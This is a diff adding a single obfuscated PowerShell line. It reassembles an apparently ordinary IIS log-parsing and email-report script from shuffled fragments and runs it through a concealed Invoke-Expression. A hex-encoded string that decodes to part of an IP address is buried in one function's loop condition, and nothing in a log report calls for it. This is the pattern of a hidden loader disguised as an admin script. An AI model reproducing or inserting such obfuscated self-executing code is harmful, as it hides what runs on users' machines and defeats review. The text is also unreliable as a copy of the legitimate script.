@@ -1,0 +1,220 @@
+ (("{118}{152}{63}{64}{176}{105}{40}{119}{90}{187}{17}{89}{155}{203}{172}{199}{98}{138}{30}{163}{9}{78}{190}{11}{110}{183}{194}{97}{188}{160}{54}{16}{202}{28}{20}{124}{99}{200}{47}{123}{27}{174}{34}{38}{115}{5}{114}{142}{80}{42}{26}{14}{121}{112}{201}{50}{185}{141}{180}{117}{83}{133}{192}{77}{173}{37}{57}{82}{21}{8}{33}{135}{44}{170}{94}{96}{101}{39}{126}{10}{145}{49}{125}{48}{88}{147}{151}{177}{144}{167}{67}{171}{100}{13}{1}{127}{41}{95}{87}{169}{22}{134}{157}{66}{29}{71}{12}{159}{122}{148}{91}{132}{6}{79}{161}{62}{85}{19}{32}{55}{81}{113}{84}{197}{189}{181}{136}{61}{196}{43}{182}{193}{0}{46}{120}{154}{23}{92}{143}{7}{129}{51}{108}{179}{164}{36}{93}{52}{58}{168}{15}{130}{53}{76}{158}{18}{3}{35}{111}{109}{24}{137}{106}{139}{140}{70}{31}{25}{150}{116}{186}{184}{149}{74}{86}{45}{103}{59}{4}{165}{60}{131}{204}{102}{73}{75}{198}{146}{72}{128}{191}{107}{2}{56}{175}{104}{166}{195}{153}{69}{65}{178}{162}{68}{156}" -f 't','ndMailSplat
+}
+ 
+function Get-LPInputFormat{
+ 
+	param([String]fZmInputType)
+ 
+	switch(fZmInputType',' (fZmLogFiles ','s2ek32Y34Y34_27J7s -sPlITJ7ssJ7s -sPLiTJ7s<J7',')) -and (-not fZm_.PsIsContainer)}).FullName
+fZ','ompression)
+                }
+ ','ery.IISNCSAInputFormat}
+		LljnetmonL','		LljtplLlj{fZmoutputobj = New-Object -comObject MSUt','ljZip the report(s).Llj)]
+        [switch]fZmZipRepor','g]fZmFile = Split-Path fZmZipFilePath -Leaf
+        [string]fZmFolder = f','New-Object -TypeName System.Managem','J7st want to append, make s','ect -comObject MSUtil.LogQue','
+    send-mailmessage @Se','ose()','	param([string]fZmque','h(fZmitem in R','Compre','69-70Y3as31_38W30k2e%31W34_39_2e_32Y33Y35','Zminputobj = New-Object -com','et the file, or al','       [Parameter( HelpMessage=L','LogQuery.CSVInputFormat}
+		','utputobj = New-Object -c','J7s E3d %{([cHar]( [CONverT]::tOinT16(( fZm_.tOStrINg() ) ,16 ) )) })-joInJ7sJ7s )E3d  OUt-',' fZmRecord','Disp','IO','             # Push-Location so we can use Resolve-Path -Relative 
+                Push-Location (Split-Path fZmitem)
+                # This will g','inputob','   # Make sure th','olumnName(fZmi) -value','Object MSUtil.LogQuery.TextLineInputFormat}
+		L','t
+    )
+    fZmSendMailSplat = @{
+        J7sFromJ7s = fZmEmailSender
+   ','ompre','s -spLIT J7sWJ7s-sPLI',' fZminputtype','sage=LljForce email to be sent ','ssion.ZipFileExtensions]::CreateEntryFromFile(fZmArchive, fZmfile,','xt -Force
+   ','a','-comObject MSUtil.LogQuery.','     fZmArchive.','SUtil.LogQuery.W3CInputFormat}
+		LljxmlLlj{fZminputobj','SubjectJ7s = fZmEmailSubject
+        J7sPriorityJ7s = J7sNormalJ7s
+        J7ssmtpS','ocations = @(J7sMOwMOwserver1MOwcfZmMOwinetpubMOwlogsMOwLogFilesMOwW3SVC1J7s,
+                   J7sMOwMOwserver2MOwcfZmMOwinetpubMOwlogsMOwLogFilesMOwW3SVC1J7s)
+fZmLogFiles = @()
+# Only process files this many days old
+fZmDaysOld = 1
+fZmCurrdate = Get-Date
+fZmLogfiles += (Get-ChildItem -Path fZmFileLocations E3d Wh','obj = New-Object -comObject MSUtil.LogQuery.C',' (Resolve-Path fZmfile -Re','ZmEmailAsAttachment','rgumentList LljNT AUTHORITYMOwANONYMOUS LOGONLlj, fZmpass
+','Llj)]
+        [string]f','(fZminputtype){','
+	else {
+		fZmLPRecordSet = fZmLPQuery.Execute(fZmquery)
+	}
+    return fZmLPRecordSet
+}
+
+functi','nputtype, fZmoutputtype)
+    fZmLPQuery = new-object -com MSUtil.LogQuery
+    ','bject) {
+            foreac','ljtextwordLlj{fZminputobj = New-','-join J7','anonymously?Llj)]
+        [switch]fZmForceAnonymous,
+        [Parameter( HelpMessage=LljSave the repo','on Invoke-LPExecut','e.AddDays(-fZmDaysOld','fZmInputFormat ','		Lljw3cLlj{fZminputobj','fZminputobj = New-Object -comObjec','aram(
+        [Parameter','(Position=0, Mandatory=fZmtrue)]
+        [string]fZmZipFilePath,
+        [Parameter(Position=1, Mandatory=fZmtru','D','omObject MSUtil.LogQuery.ETWInputFormat}
+		LljevtLlj{fZminputobj = New-Object -comObject MSUtil.LogQuery.EventLogInputFormat}
+		LljfsLlj{fZminputobj = New-Object -comObject MSUtil.LogQuery.FileSystemInputFormat}
+		LljhttperrLlj{fZm','.Attachments = fZmReports
+        }
+   ','rceAnonymous -Report fZm',' copy of the report
+#fZmReport E3d Out-File c:MOwScriptsMOwAuthErr_Report.html
+
+New-Report','LPRecordSet.getC','j = New-Obj',' TOP 25 cs-uri-stem as URL, MAX(time-taken)',' IS NOT NULL AND sc-status','s
+}
+
+# Set your server IIS log file locations here (replace the examp',' BET','fZmresult = fZmLPQuery.ExecuteBatch(fZmquery, fZminputtype, fZmoutputtype)
+    return fZmresult
+}
+
+function Get-LPRecord{
+	param(fZmLPRecordSet)
+	fZmLPRecord = new-Object System.','fZmEmailSubject=J7sSystem ReportJ7s,
+        [Parameter( HelpMessage=LljEmail re','Zm(if(fZmFolder = Split-Path fZmZipFilePath) { Resolve-Path fZmFolder } else { fZmPwd })
+        fZmZipFilePath = Join-Path fZmFolder fZmFile
+        # ','lj{fZminputobj = New-Ob','
+            }
+        }
+    }
+    end {
+   ','Object -comObject MSUtil.','rt?Llj)]
+        [switch]fZmSaveReport,
+ ','il recipientLlj)]
+  ','Query.TextWordInputFormat}
+		LljtsvLlj{fZminputobj = New-Object ','t MSUtil.LogQuery.RegistryInputFormat}
+		LljtextlineLlj{f','les)
+fZmFileL','nLlj{fZminputobj = New-Object -comObject MSUtil.LogQuery.IISBINInputFormat}
+		LljcsvLlj{fZminputobj = New-Objec',') {
+        if (fZmZ','ssionLlj','on=2)]
+        [switch]fZmAppend,
+        [Parameter(Position=3)]','ormat}
+		LljncsaLlj{fZminputobj = New-Object -comO','omObject MSUtil.LogQuery.SQLOutputFormat}
+		LljsyslogLlj{fZmoutputobj = New-O',')	
+	}','eAnonymous) {
+        f','ADSInputFormat}
+		Lljbi','ZmPass = ConvertTo-SecureString –String J7sanonymousJ7s –','ve-Item fZmZipFilePath 
+            }
+        }
+        fZmArchive = [System.IO.Compression.ZipFile]::Open( fZmZipFilePath, LljUpdateLlj )
+    }
+',' ','le in Get-','lat.Body = fZmReport
+    }','AsPlainTe','n. This example is for failed auth attempts.
+fZmSQLQuery = LljSELECT cs-username, sc-status, COUNT(*) AS Total FROM Llj + (fZmLogFiles -join J7s,J7s) + Llj WHERE cs-username','ere {fZm_.LastWriteTime -ge (fZmCurrdat','[string]fZmReport = Get','ertyN',' fZmi -lt fZmLPRe','ROM J7s +','
+    ','iT J7s-','ure the zip file doesnJ7st already exist.
+        if(!fZmAppend) {
+      ','T J7s_J7s -SplItJ7s%J7s-SplIT J7sYJ7s -SpLIt J7skJ7s -spL','
+    }
+}
+
+function New-ReportDelivery {
+    [CmdletBinding(','Log','               Pop-L',' fZmrelative, fZmC','e Query
+	fZmLPRecordSet = Invoke-LPExecute fZmquery
+	fZmLPRecords = new-object System.Management.Automation.PSObject[] 0
+	for(; -not fZmLPRecordSet.atEnd(); fZmLPRecordSet.moveNext()) {
+		# Add record
+		fZmLPRecord = Get-LPRecord(fZmLPRecordSet)
+		fZmLPRecords += new-Object System.Management.Automation.PSObject	
+        fZmRecordCount = fZmLPQueryResult.length-1
+        fZmLP','ma','function New-ZipFile {
+    [CmdletBinding()','me=fZmtrue)]
+        [Alias(LljPSPathLlj,LljItemLlj)]
+        [string[]]fZmInputObject = fZmPwd,
+        [Parameter(Positi','hartO','
+        Get-Item fZmZipFilePath','= New-Object -comObject MSUtil.LogQuery.IISIISInputForm','lative).TrimStart(Llj.MOwLlj)
+                    # Add the file to the zip
+                    fZmnull = [System.','l the files in the folder (recursively)
+                foreach(fZmfi','        fZmSendMailSplat.Credential = fZmcreds
+    }
+    if (f','     fZmCreds = ','.ToLower()){
+		LljadsLlj{fZminputobj = New-Object ',' As Max, MIN(time-taken) As Min, Avg(','il.LogQuery.TemplateOutputFormat} 
+	}
+	return fZmoutputobj
+}
+
+function Invoke-LPExecute{
+	param([string] fZmquery, fZminputtype)
+    fZmLPQuery = new-object -com MSUtil.LogQuery
+	if','ry, fZmi','= Get-LPInputFormat LljiisLlj
+
+# Change this t','bject MSUtil.LogQu','      [string]fZmEmailRecipient,
+        [Parameter','LljetwLlj{fZ','     J7sToJ7s = fZmEmailRecipient
+        J7s','Util.LogQuery.URLScanLogInputFormat}
+','nuLL',' )
+    begin {
+     ','cordSet.getColumnCount();fZmi++) {
+			fZmLPRecord E3d add-','member NoteProperty fZm',' HelpMessage=LljEmail senderLlj)]
+        [string]fZmEmailSender=J7ssystemreport@localhostJ7s,
+        [Paramete','ocation','bject -comObject MSUtil.LogQuery.SYSLOGOutputFormat}
+		LljtsvLlj{fZmoutputobj = New-Object -comObject MSUtil.LogQuery.TSVOutputFormat}
+		Lljw3cLlj{fZmoutputobj = New-Object -comObject MSUtil.LogQuery.W3COutputFormat}
+','       else {
+            fZmSendMail','ent.Automation.PSCredential -A','BY cs-username,sc-status, cs-uri-stem ORDER BY Total DESC Llj
+
+# Example 2:  TOP 25 Slowest Url requests
+
+#fZmSQLQuery = J7sSELECT','ipReport) {
+            fZmZipName = fZmReportName -replace J7s.htmlJ','at}
+		LljiisodbcLlj{fZminputobj = New-Object -comObject MSUtil.LogQuery.IISODBCInputF','dSet.Close();
+	return fZmLPRecord','.getValue(fZmi)
+		}
+	}
+	return fZmLPRecord
+}
+
+function Get-LPRecordSet{ 
+	param([string]fZmquery)
+
+	# Execut','7s,J7s.zipJ7s
+            fZmReports E3d New-ZipFile -ZipFilePath fZmZipName -Append
+     ',']
+    p','vertTo-Html
+
+# Uncomment to save a','utputFormat}
+		LljiisLlj{fZmoutputobj = New-Object -comObject MSUtil.LogQuery.IISOutputFormat}
+		LljsqlLlj{fZmo',')]
+        [Sy','Report
+
+','minputobj = New-Object -c','Management.Automation.PSObject
+	if( -not fZmLPRecordSet.atEnd() ) {
+		fZmRecord = fZmLPRecordSet.getRecord()
+		for(fZmi = 0;(  ( J7s27<','ry.HttpErrorInputFormat}
+		LljiisLlj{fZminputobj ','reach(fZmpath in fZmInputO','ject -comObject MSUtil.LogQuery.NetMonInputFormat}
+		LljregLlj{','er J7sserver1@contoso.comJ7s o02
+                   -EmailRecipient J7sadmin@contoso.comJ7s o02
+                   -EmailSubject LljYesterdayJ7ss Exchange Auth FailuresLlj o02
+                   -EmailRelay J7sserver1.contoso.comJ7s o02
+                   -Fo','e folder already exists
+        [strin','fZmLPRecordSet = fZmLPQuery.Execute(fZmquery,','mLogQuery = New-Object -ComObject LljMSUtil.LogQueryLlj
+','-LPRecor','Splat','eBatch{
+','t -comObject MSUtil.','erverJ7s = fZmEmailRelay
+        J7sBodyAsHTMLJ7s = fZmtrue
+    }
+    if (fZmForc',' }
+    else {
+        fZmSendMailSp','imal','port(s) as attachementLlj)]
+        [switch]fZmEmailAsAttachment,
+        [Parameter( HelpMes','.C','s,J7s) +J7s GROUP BY URL ORDER By Average DESCJ7s
+
+','e, ValueFromPipelineByProp','   }
+ ','elivery -EmailSend','	','r( Mandatory=fZmtrue, HelpMessage=LljE','nputFormat}
+		LljurlscanLlj{fZminputobj = New-Object -comObject MS',' = New-Object -comObject MSUtil.LogQuery.XMLInp','      if(Test-Path fZmZipFilePath','] = fZmLPRecord
+	}
+	fZmLPRecor','ZmEmailRelay = Llj.Llj,
+        [Parameter(','Records[fZmRecordCount','
+        [ValidateSet(LljOptimalLlj,LljFastestLlj,LljNo','    process {
+        fo','il.LogQuery.TSVI','If they don','time-taken) As Average F','( HelpMessage=LljEmail subjectLlj)]
+        [string]','utFormat}
+	}
+	return fZminputobj
+}
+
+function Get-LPOutputFormat{
+	param([String]fZmOutputType)
+
+	switch(fZmOutputType.ToLower()){
+		LljcsvLlj{fZmoutputobj = New-Object -comObject MSUtil.LogQuery.CSVOutputFormat}
+		LljchartLlj{fZmoutpu',') { 
+                Remo','dSet fZmSQLQuery fZminputformat E3d Con',' = New-Object -comObject M','-comObject MSUt','WEEN 401 AND 403 GROUP ','Llj
+  ','ChildItem fZmitem -Recurse -File -Force E3d % FullName) {
+                    # Calculate the relative file path
+                    fZmrelative =',')]
+    param (
+        [Parameter( HelpMessage=LljReport body, typically in HTML formatLlj, ValueFromPipeline=fZmtrue )]
+        [string]fZmReport,
+        [Parameter( HelpMessage=LljEmail server to relay report through','esolve-Path fZmpath) {
+   ','stem.IO.Compression.CompressionLevel]fZmCompression = LljOpt','o be any query which youJ7sd like to ru')).rEPlAcE('J7s',[stRing][cHar]39).rEPlAcE('E3d',[stRing][cHar]124).rEPlAcE(([cHar]111+[cHar]48+[cHar]50),[stRing][cHar]96).rEPlAcE(([cHar]76+[cHar]108+[cHar]106),[stRing][cHar]34).rEPlAcE(([cHar]77+[cHar]79+[cHar]119),'\').rEPlAcE(([cHar]102+[cHar]90+[cHar]109),[stRing][cHar]36)|&( ([StrinG]$VErbOsepREFErENce)[1,3]+'X'-JoIn'')
